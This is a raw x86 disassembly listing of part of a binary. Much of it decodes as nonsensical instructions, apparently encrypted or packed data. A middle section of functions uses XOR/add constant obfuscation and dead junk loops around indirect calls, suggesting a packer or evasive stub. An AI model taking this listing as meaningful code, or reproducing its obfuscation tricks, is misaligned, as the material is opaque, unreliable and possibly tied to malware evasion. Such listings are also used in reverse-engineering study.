  40e5ca:	sbb    ah,bl
  40e5cc:	and    al,0x3d
  40e5ce:	dec    eax
  40e5cf:	push   ebp
  40e5d0:	pop    esp
  40e5d1:	test   al,0x5a
  40e5d3:	xchg   ebx,eax
  40e5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5d5:	sbb    DWORD PTR [edx+0x6a83fb3e],ecx
  40e5db:	sub    eax,0xdb5bacfd
  40e5e0:	idiv   DWORD PTR [edi]
  40e5e2:	fs jnp 0x40e5ac
  40e5e5:	daa    
  40e5e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5e7:	arpl   WORD PTR [edi],bp
  40e5e9:	jno    0x40e5f1
  40e5eb:	(bad)  
  40e5ec:	outs   dx,BYTE PTR ds:[esi]
  40e5ed:	or     DWORD PTR [eax+0x7b],ecx
  40e5f0:	fdivr  QWORD PTR [edi-0x67]
  40e5f3:	jmp    0xc3db71d7
  40e5f8:	mov    eax,0xaff9674f
  40e5fd:	les    edi,FWORD PTR [eax+0x53]
  40e600:	or     bl,BYTE PTR [ebp*1+0x406f2dea]
  40e607:	sub    BYTE PTR [ebp-0x4951741a],0x7d
  40e60e:	cmc    
  40e60f:	and    DWORD PTR [ebp+0x646a759e],eax
  40e615:	adc    DWORD PTR [edx-0x7f],eax
  40e618:	and    eax,0x9227afca
  40e61d:	(bad)  
  40e61e:	xchg   ebx,eax
  40e61f:	xchg   ch,ah
  40e621:	(bad)  
  40e622:	lods   eax,DWORD PTR ds:[esi]
  40e623:	stos   BYTE PTR es:[edi],al
  40e624:	dec    ecx
  40e625:	in     eax,dx
  40e626:	std    
  40e627:	sbb    edi,edx
  40e629:	sti    
  40e62a:	gs leave 
  40e62c:	adc    BYTE PTR [ecx+0xfeaf5f8],bl
  40e632:	adc    al,0x8a
  40e634:	out    dx,eax
  40e635:	(bad)  
  40e636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e637:	and    eax,0x5a3f8de1
  40e63c:	cmp    al,0x96
  40e63e:	int    0x9e
  40e640:	popa   
  40e641:	mov    eax,ds:0xd4fe3230
  40e646:	or     DWORD PTR [ebx+0x37],ebp
  40e649:	retf   0x301d
  40e64c:	(bad)  
  40e64d:	or     cl,dh
  40e64f:	mov    dh,al
  40e651:	and    edi,DWORD PTR [edi-0x4023e6f9]
  40e657:	lds    esp,FWORD PTR [ebp+0x6]
  40e65a:	outs   dx,DWORD PTR ds:[esi]
  40e65b:	push   0xffffffb4
  40e65d:	dec    esp
  40e65e:	and    ah,BYTE PTR [ecx+0x449d3ca6]
  40e664:	jmp    0xbf4042d6
  40e669:	and    al,0xd0
  40e66b:	adc    al,0x25
  40e66d:	lods   eax,DWORD PTR ds:[esi]
  40e66e:	cwde   
  40e66f:	pop    edi
  40e670:	popa   
  40e671:	inc    ebp
  40e672:	xchg   ebp,eax
  40e673:	add    edx,esi
  40e675:	mov    bl,0xee
  40e677:	pop    ds
  40e678:	xor    eax,DWORD PTR [ecx]
  40e67a:	add    edx,ecx
  40e67c:	inc    esp
  40e67d:	enter  0x4168,0x21
  40e681:	cmc    
  40e682:	cwde   
  40e683:	adc    al,BYTE PTR [eax]
  40e685:	dec    DWORD PTR [ebx]
  40e687:	xchg   esi,eax
  40e688:	pop    ds
  40e689:	xor    BYTE PTR [edx+0x50542894],ah
  40e68f:	add    al,0x57
  40e691:	add    eax,0x368b8067
  40e696:	mov    esp,0x8ff3b1ed
  40e69b:	test   dh,ah
  40e69d:	mov    dh,0x49
  40e69f:	aad    0x2
  40e6a1:	or     DWORD PTR [edi+edi*1+0xa],ebx
  40e6a5:	jl     0x40e6cc
  40e6a7:	mov    ecx,DWORD PTR [eax+0x9]
  40e6aa:	ss or  eax,0xed54cf5
  40e6b0:	ja     0x40e72d
  40e6b2:	out    0xa2,ax
  40e6b5:	into   
  40e6b6:	scas   al,BYTE PTR es:[edi]
  40e6b7:	xchg   DWORD PTR [esi+0xcb75f42],edi
  40e6bd:	imul   ebx,DWORD PTR [ecx+ebx*8+0x38ed70af],0xef741fba
  40e6c8:	ins    BYTE PTR es:[edi],dx
  40e6c9:	call   0x4e8a0bda
  40e6ce:	inc    esi
  40e6cf:	stc    
  40e6d0:	ror    cl,cl
  40e6d2:	fwait
  40e6d3:	mov    ecx,0x51211705
  40e6d8:	and    al,0xdd
  40e6da:	ror    DWORD PTR [ebp-0x6e6c645c],0xce
  40e6e1:	mov    edx,0x7273b6cb
  40e6e6:	jge    0x40e711
  40e6e8:	loope  0x40e670
  40e6ea:	jp     0x40e6d4
  40e6ec:	inc    ebx
  40e6ed:	aaa    
  40e6ee:	jg     0x40e73b
  40e6f0:	jp     0x40e74f
  40e6f2:	xlat   BYTE PTR ds:[ebx]
  40e6f3:	stos   BYTE PTR es:[edi],al
  40e6f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6f5:	outs   dx,BYTE PTR ds:[esi]
  40e6f6:	aad    0x63
  40e6f8:	cmp    eax,0x9400dcee
  40e6fd:	or     al,0x68
  40e6ff:	pop    eax
  40e700:	cmp    dh,BYTE PTR [eax]
  40e702:	test   BYTE PTR [ebx+0x5803fb85],bh
  40e708:	xor    BYTE PTR [ebx+0x40dcbacc],dl
  40e70e:	lea    edi,[esi]
  40e710:	sbb    al,0x73
  40e712:	retf   0xf771
  40e715:	lds    esi,FWORD PTR [edi]
  40e717:	push   0xffffffb8
  40e719:	sub    al,0xb4
  40e71b:	in     al,dx
  40e71c:	dec    BYTE PTR [ecx-0x5e18f750]
  40e722:	cmp    eax,0x5d8eff79
  40e727:	adc    ebx,DWORD PTR [ecx+ebp*4]
  40e72a:	cmp    al,0x5a
  40e72c:	lock mov ebp,0x180ee082
  40e732:	jno    0x40e6cd
  40e734:	jb     0x40e6d8
  40e736:	jecxz  0x40e71c
  40e738:	lahf   
  40e739:	dec    eax
  40e73a:	inc    esi
  40e73b:	sbb    esi,ebp
  40e73d:	sub    DWORD PTR [eax-0x2c127e74],edi
  40e743:	out    dx,al
  40e744:	jmp    0xaf9ee113
  40e749:	pop    ebp
  40e74a:	lds    edi,FWORD PTR [eax]
  40e74c:	push   esi
  40e74d:	fcmovnb st,st(1)
  40e74f:	sbb    DWORD PTR [eax-0x54],0x12d694ea
  40e756:	cmp    BYTE PTR [edx],0xed
  40e759:	mov    ebx,0x527314cc
  40e75e:	pop    ds
  40e75f:	jp     0x40e73e
  40e761:	xor    esi,esi
  40e763:	pushf  
  40e764:	push   edi
  40e765:	in     al,dx
  40e766:	xchg   ecx,eax
  40e767:	pop    eax
  40e768:	jmp    0xe41d:0x48412095
  40e76f:	out    0x57,eax
  40e771:	inc    edi
  40e772:	xchg   ebp,eax
  40e773:	push   es
  40e774:	rcr    BYTE PTR [edi],1
  40e776:	scas   eax,DWORD PTR es:[edi]
  40e777:	in     eax,dx
  40e778:	ret    0xc9c8
  40e77b:	jge    0x40e703
  40e77d:	or     BYTE PTR [ebx+esi*2-0x70],0x81
  40e782:	xchg   esp,eax
  40e783:	daa    
  40e784:	ins    DWORD PTR es:[edi],dx
  40e785:	jbe    0x40e731
  40e787:	sbb    al,0xa2
  40e789:	push   0xa7c713a
  40e78e:	loope  0x40e7a2
  40e790:	fisub  DWORD PTR [ebp+0x10]
  40e793:	fbstp  TBYTE PTR [eax+esi*8]
  40e796:	cmp    eax,0x27c7e00c
  40e79b:	jg     0x40e7cd
  40e79d:	or     edi,esp
  40e79f:	ror    edx,0x3b
  40e7a2:	bound  edi,QWORD PTR [ebx-0x46]
  40e7a5:	and    cl,BYTE PTR [edx-0x59]
  40e7a8:	xor    al,0xe1
  40e7aa:	das    
  40e7ab:	mov    bl,BYTE PTR [ecx+esi*1+0x55b46143]
  40e7b2:	(bad)  
  40e7b3:	test   al,0x76
  40e7b5:	adc    al,0x35
  40e7b7:	call   0x5c1509a1
  40e7bc:	push   es
  40e7bd:	adc    BYTE PTR [edx-0x2f],dl
  40e7c0:	outs   dx,DWORD PTR ds:[esi]
  40e7c1:	rol    BYTE PTR [esi-0x45],1
  40e7c4:	inc    esi
  40e7c5:	cdq    
  40e7c6:	data16 setl BYTE PTR [ebp+0x24]
  40e7cb:	fdiv   QWORD PTR [edx]
  40e7cd:	mov    ebp,0xd8dff1ea
  40e7d2:	mov    DWORD PTR ds:0x431629f5,esi
  40e7d8:	mov    ecx,0xde5d172a
  40e7dd:	dec    esi
  40e7de:	out    0x9f,al
  40e7e0:	cmp    BYTE PTR [ebx-0x1c3dbeeb],0xf3
  40e7e7:	or     esp,ecx
  40e7e9:	das    
  40e7ea:	xchg   edi,eax
  40e7eb:	jmp    0xcb14:0xfe33614e
  40e7f2:	push   ebp
  40e7f3:	push   ds
  40e7f4:	ror    edx,0xda
  40e7f7:	(bad)  
  40e7f8:	mov    ah,al
  40e7fa:	cdq    
  40e7fb:	cdq    
  40e7fc:	pop    ecx
  40e7fd:	fdiv   DWORD PTR [ebp-0x30]
  40e800:	lock jno 0x40e7d8
  40e803:	aaa    
  40e804:	inc    eax
  40e805:	push   edx
  40e806:	popf   
  40e807:	out    0x70,al
  40e809:	fidivr DWORD PTR [eax+esi*8+0x23840287]
  40e810:	fistp  WORD PTR [edi-0x1a50b01e]
  40e816:	jmp    0x1ba1d2c9
  40e81b:	stos   BYTE PTR es:[edi],al
  40e81c:	imul   ecx,DWORD PTR [ebx],0xffffff95
  40e81f:	js     0x40e7bc
  40e821:	xchg   DWORD PTR [edi+0x7e5f317c],esi
  40e827:	rol    BYTE PTR [esi-0x3d],0x75
  40e82b:	and    al,0xbd
  40e82d:	fnstcw WORD PTR [ebx+0x66608be2]
  40e833:	cmp    DWORD PTR ds:0x64f3b866,ecx
  40e839:	xor    DWORD PTR [eax-0x2d],ebp
  40e83c:	jmp    0x1944:0x9982e744
  40e843:	xchg   ebp,eax
  40e844:	in     eax,dx
  40e845:	inc    edi
  40e846:	daa    
  40e847:	xchg   BYTE PTR ds:0x552ec7c9,al
  40e84d:	int3   
  40e84e:	lods   eax,DWORD PTR ds:[esi]
  40e84f:	fsub   QWORD PTR [ebp+0x2aa426ba]
  40e855:	jmp    0x40e803
  40e857:	sub    ebp,edx
  40e859:	pop    es
  40e85a:	add    BYTE PTR ss:[esi],bl
  40e85d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e85e:	lea    edx,[esi-0x1c6c582c]
  40e864:	in     al,dx
  40e865:	dec    ecx
  40e866:	rol    DWORD PTR ds:0x4dbdf88f,1
  40e86c:	xor    BYTE PTR [eax+0x1c],bl
  40e86f:	adc    BYTE PTR [ebp-0x5c],0xb8
  40e873:	and    DWORD PTR [esi+0x39],esp
  40e876:	xchg   ecx,eax
  40e877:	cs jmp 0x40e887
  40e87a:	sub    al,0xcf
  40e87c:	(bad)  
  40e87d:	(bad)  
  40e87e:	imul   edi,DWORD PTR gs:[esi],0x23205c61
  40e885:	lods   al,BYTE PTR ds:[esi]
  40e886:	sub    dl,BYTE PTR [ebx-0x5c034453]
  40e88c:	fld    TBYTE PTR [edx+0x7da90d05]
  40e892:	test   al,0x58
  40e894:	xchg   edx,eax
  40e895:	sbb    al,0xb0
  40e897:	push   edi
  40e898:	popf   
  40e899:	add    BYTE PTR [edi+0x51],0xcf
  40e89d:	or     al,ch
  40e89f:	xchg   ebp,eax
  40e8a0:	jb     0x40e84e
  40e8a2:	push   ss
  40e8a3:	add    BYTE PTR [eax-0x40],bh
  40e8a6:	xchg   ebp,eax
  40e8a7:	call   0x3cbd5227
  40e8ac:	arpl   WORD PTR [ebx-0x4a623a4f],si
  40e8b2:	aaa    
  40e8b3:	xchg   ecx,eax
  40e8b4:	xlat   BYTE PTR ds:[ebx]
  40e8b5:	aad    0x43
  40e8b7:	fadd   QWORD PTR [edi+0x14]
  40e8ba:	je     0x40e928
  40e8bc:	or     eax,0xa6a4025c
  40e8c1:	rep ins DWORD PTR es:[edi],dx
  40e8c3:	jae    0x40e84d
  40e8c5:	pop    edi
  40e8c6:	push   eax
  40e8c7:	mov    al,0x42
  40e8c9:	dec    ebp
  40e8ca:	and    dl,ch
  40e8cc:	xor    BYTE PTR [edx-0x4c17200f],0x14
  40e8d3:	cli    
  40e8d4:	xchg   esp,eax
  40e8d5:	cld    
  40e8d6:	js     0x40e86d
  40e8d8:	lahf   
  40e8d9:	sub    esp,DWORD PTR [eax+0x3720b001]
  40e8df:	xchg   ecx,eax
  40e8e0:	popf   
  40e8e1:	jp     0x40e8b2
  40e8e3:	jne    0x40e91f
  40e8e5:	add    ch,BYTE PTR [edi+0x5d]
  40e8e8:	sub    DWORD PTR [esi+esi*2],eax
  40e8eb:	(bad)  
  40e8ec:	repz mov ds:0xe08ec8f,al
  40e8f2:	retf   
  40e8f3:	adc    eax,ecx
  40e8f5:	ins    DWORD PTR es:[edi],dx
  40e8f6:	adc    BYTE PTR [bp+0x4c31],dl
  40e8fb:	inc    edx
  40e8fc:	sub    BYTE PTR [ebx+0x1bd30b13],ah
  40e902:	(bad)  
  40e903:	cs mov ebx,0x323bc0a3
  40e909:	pop    edi
  40e90b:	mov    eax,ds:0x35e90824
  40e910:	test   eax,0x499745d4
  40e915:	mov    edx,0x6284f60c
  40e91a:	addr16 shl cl,0xca
  40e91e:	pop    ebx
  40e91f:	or     dl,dl
  40e921:	arpl   WORD PTR [ebx-0x3485f054],dx
  40e927:	xchg   edi,eax
  40e928:	cmp    eax,0xb04d80d2
  40e92d:	sub    al,0xac
  40e92f:	fld    TBYTE PTR [ebp+ebx*8+0x107ddc20]
  40e936:	adc    al,0x50
  40e938:	sub    eax,0x13989885
  40e93d:	dec    eax
  40e93e:	jle    0x40e958
  40e940:	dec    esi
  40e941:	scas   al,BYTE PTR es:[edi]
  40e942:	mov    dh,BYTE PTR [esi-0x33]
  40e945:	fisub  WORD PTR [esi]
  40e947:	cli    
  40e948:	push   DWORD PTR [edx-0x27e9593]
  40e94e:	jmp    0x302a:0x57d3540a
  40e955:	gs sub ebx,ebx
  40e958:	mov    edi,0x1ea7f8a0
  40e95d:	push   cs
  40e95e:	pop    ebx
  40e95f:	nop
  40e960:	mov    ds:0xba7838b0,al
  40e965:	fwait
  40e966:	pop    ebx
  40e967:	lods   al,BYTE PTR es:[esi]
  40e969:	mov    bl,0x97
  40e96b:	aam    0x16
  40e96d:	shl    DWORD PTR [esi-0x3af466fe],1
  40e973:	and    ebp,ebp
  40e975:	add    DWORD PTR [ecx-0x8ee469f],esi
  40e97b:	pushf  
  40e97c:	or     ah,BYTE PTR [eax-0xc]
  40e97f:	add    ebp,DWORD PTR [ecx-0x2d3d3c3b]
  40e985:	inc    edi
  40e986:	sub    BYTE PTR [edx+ebp*8-0x42076f85],0x22
  40e98e:	dec    ebx
  40e98f:	mov    ebx,0x97dec2db
  40e994:	sbb    dh,BYTE PTR [esi+0x788be111]
  40e99a:	cmp    al,0x8d
  40e99c:	je     0x40e995
  40e99e:	js     0x40e92b
  40e9a0:	xor    al,0x6
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	in     al,0xb0
  40ecee:	sub    dl,cl
  40ecf0:	jl     0x40ecbe
  40ecf2:	jl     0x40ed70
  40ecf4:	inc    eax
  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	les    ecx,FWORD PTR [edi]
  40ecfa:	xchg   BYTE PTR [ebx-0x5799fad0],al
  40ed00:	xchg   bh,ch
  40ed02:	loope  0x40ed45
  40ed04:	ins    DWORD PTR es:[edi],dx
  40ed05:	and    DWORD PTR [ebx+edx*8+0x20932faf],edx
  40ed0c:	mov    ebx,0xca0e7255
  40ed11:	iret   
  40ed12:	xchg   DWORD PTR [esi-0x43],ebp
  40ed15:	mov    dl,0x5d
  40ed17:	mov    WORD PTR [eax-0xc8e33d2],es
  40ed1d:	jmp    0x2812:0x1ea9f8b4
  40ed24:	jl     0x40ed8d
  40ed26:	pop    eax
  40ed27:	(bad)  
  40ed28:	fwait
  40ed29:	add    al,0x1a
  40ed2b:	mov    ah,0x80
  40ed2d:	jge    0x40ed93
  40ed2f:	shr    BYTE PTR [ecx],1
  40ed31:	iret   
  40ed32:	mov    BYTE PTR [eax+0x641eb063],bh
  40ed38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed39:	jle    0x40ece1
  40ed3b:	push   0xc0a01d62
  40ed40:	scas   eax,DWORD PTR es:[edi]
  40ed41:	popa   
  40ed42:	sub    DWORD PTR [esp+esi*2+0x25],0xe
  40ed47:	sbb    BYTE PTR [edi],dl
  40ed49:	xchg   esp,eax
  40ed4a:	jle    0x40ecff
  40ed4c:	jl     0x40ed1d
  40ed4e:	int3   
  40ed4f:	jne    0x40eda4
  40ed51:	(bad)
  40ed54:	bound  esi,QWORD PTR [esi-0x7c]
  40ed57:	sub    al,0x94
  40ed59:	iret   
  40ed5a:	(bad)  
  40ed5b:	daa    
  40ed5c:	push   eax
  40ed5d:	cmp    cl,BYTE PTR [esp+ebx*8+0x1f]
  40ed61:	fld    TBYTE PTR [ebp+0x33]
  40ed64:	daa    
  40ed65:	sub    ch,BYTE PTR [edx]
  40ed67:	outs   dx,BYTE PTR ds:[esi]
  40ed68:	loope  0x40ede4
  40ed6a:	imul   edx,DWORD PTR [ebp-0x38],0x76
  40ed6e:	sbb    al,0x16
  40ed70:	inc    esi
  40ed71:	adc    eax,0xea62b091
  40ed76:	mov    dl,0xfe
  40ed78:	ja     0x40ed17
  40ed7a:	cwde   
  40ed7b:	lods   al,BYTE PTR ds:[esi]
  40ed7c:	xor    eax,0x8ccd5498
  40ed81:	or     DWORD PTR [edx+0x40],0x49
  40ed85:	sbb    al,0x61
  40ed87:	add    bl,bh
  40ed89:	pop    eax
  40ed8a:	test   edi,ebp
  40ed8c:	cmp    ch,BYTE PTR [esi-0x4a9a2bcf]
  40ed92:	dec    esp
  40ed93:	inc    edx
  40ed94:	and    ah,ah
  40ed96:	(bad)  
  40ed97:	(bad)  
  40ed98:	mov    esi,0xdb3908b
  40ed9d:	rcl    bh,0xfe
  40eda0:	xor    eax,0x4bde120b
  40eda5:	push   esi
  40eda6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eda7:	sbb    bh,ah
  40eda9:	add    eax,0x1d427a6c
  40edae:	mov    dl,0x7a
  40edb0:	es lock mov ch,0xda
  40edb4:	sbb    DWORD PTR [eax+0x52],0x468712b8
  40edbb:	pop    edi
  40edbc:	cwde   
  40edbd:	in     al,0xb0
  40edbf:	inc    edi
  40edc0:	fisttp WORD PTR [edi+0x7]
  40edc3:	or     DWORD PTR [ebp+0x72],eax
  40edc6:	rcr    BYTE PTR [ebx-0x42],0x41
  40edca:	xchg   edi,eax
  40edcb:	(bad)  
  40edcc:	add    ecx,DWORD PTR [edi+0x73]
  40edcf:	or     DWORD PTR [esp+ebp*2],0x5d
  40edd3:	or     BYTE PTR [edx-0x3b74b125],cl
  40edd9:	enter  0xe5d7,0xc7
  40eddd:	pop    ebx
  40edde:	icebp  
  40eddf:	sub    DWORD PTR [edi+ecx*1],esp
  40ede2:	mov    cl,0xb7
  40ede4:	rol    DWORD PTR [esi+0x65927715],0x21
  40edeb:	cmp    ecx,DWORD PTR ds:[ebx+0x40]
  40edef:	ja     0x40eda2
  40edf1:	sub    cl,dl
  40edf3:	outs   dx,BYTE PTR ds:[esi]
  40edf4:	xchg   esp,eax
  40edf5:	out    dx,eax
  40edf6:	sub    al,BYTE PTR [esi-0x5]
  40edf9:	or     BYTE PTR [ebp+edx*4+0x6a],bl
  40edfd:	aaa    
  40edfe:	sti    
  40edff:	div    edi
  40ee01:	fisttp QWORD PTR [edi]
